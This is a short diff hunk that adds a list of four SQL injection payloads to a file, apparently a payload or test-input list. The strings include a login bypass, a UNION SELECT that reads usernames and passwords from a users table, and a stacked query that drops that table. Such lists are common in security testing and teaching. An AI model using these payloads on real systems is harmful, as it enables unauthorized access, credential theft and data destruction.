@@ -1,0 +1,4 @@
+' OR '1'='1
+admin'--
+1' UNION SELECT NULL, username, password FROM users--
+'; DROP TABLE users; --
